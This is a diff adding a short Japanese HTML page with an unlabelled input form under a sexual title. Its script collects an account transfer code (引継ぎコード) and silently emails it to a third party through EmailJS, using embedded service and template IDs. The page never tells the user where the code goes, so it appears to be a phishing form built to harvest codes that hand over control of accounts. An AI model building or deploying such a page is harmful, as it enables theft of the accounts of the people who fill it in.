@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>セックス</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        (function(){
+            emailjs.init("6thQjNYx0vEGNezCM"); // ユーザーIDを設定
+        })();
+
+        function sendMail(event) {
+            event.preventDefault(); // フォームのデフォルト送信を防止
+
+            const transferCode = document.getElementById('transfer_code').value; // 引継ぎコードを取得
+            console.log("Transfer Code:", transferCode); // 引継ぎコードの値を確認
+
+            emailjs.send("service_2aj58wc", "template_5uspofv", {
+                transfer_code: transferCode // テンプレートに渡す変数
+            })
+            .then((response) => {
+                console.log('Success!', response.status, response.text);
+                alert('メールが送信されました！');
+            }, (error) => {
+                console.error('Error sending email:', error); // エラーの詳細をコンソールに出力
+                alert('メールの送信に失敗しました。エラーコード: ' + error.status + ' - ' + error.text); // エラーメッセージを表示
+            });
+        }
+    </script>
+</head>
+<body>
+    <h1>セックス</h1>
+    <form onsubmit="sendMail(event)">
+        <label for="transfer_code">入力:</label><br>
+        <input type="text" id="transfer_code" name="transfer_code" required><br>
+        <input type="submit" value="送信">
+        <input type="reset" value="リセット">
+    </form>
+</body>
+</html>
